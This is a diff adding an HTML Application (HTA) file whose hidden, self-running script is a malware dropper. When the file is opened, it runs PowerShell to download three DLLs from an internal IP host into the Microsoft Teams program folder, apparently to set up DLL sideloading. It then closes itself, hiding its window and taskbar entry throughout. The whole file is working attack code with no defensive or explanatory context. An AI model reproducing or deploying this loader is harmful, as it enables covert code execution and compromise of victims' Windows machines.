@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <body style="display:none;">
+
+        <script type="text/javascript">
+            function downloadFile() {
+                    var shell = new ActiveXObject("WScript.Shell");
+                    var targetDirectory = shell.ExpandEnvironmentStrings("C:\\Users\\malwaredev\\AppData\\Local\\Microsoft\\Teams\\current");  // Placement of DLL
+                    var fileUrl1 = "http://192.168.12.95/cscapi.dll";  // Replace with the URL of the file to download
+                    var fileUrl2 = "http://192.168.12.95/libcurl-d.dll";  // Replace with the URL of the file to download
+                    var fileUrl3 = "http://192.168.12.95/zlibd1.dll";  // Replace with the URL of the file to download
+                    var downloadCommand = 'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\'' + fileUrl1 + '\', \'' + targetDirectory + '\\cscapi.dll\');(New-Object System.Net.WebClient).DownloadFile(\'' + fileUrl2 + '\', \'' + targetDirectory + '\\libcurl-d.dll\');(New-Object System.Net.WebClient).DownloadFile(\'' + fileUrl3 + '\', \'' + targetDirectory + '\\zlibd1.dll\')"';
+                    shell.run(downloadCommand, 1, true);
+                    window.close();
+            }
+            // Automatically run the download when the HTA is opened
+            downloadFile();
+        </script>
+        <hta:application id="oHTA" applicationname="HiddenHTA" border="thin" borderstyle="normal" caption="no" contextmenu="no" innerborder="no" maxbutton="no" minbutton="no" navigable="no" scroll="no" scrollflat="yes" selection="no" showintaskbar="no" sysmenu="no" windowstate="minimize">
+    </body>
+</html>
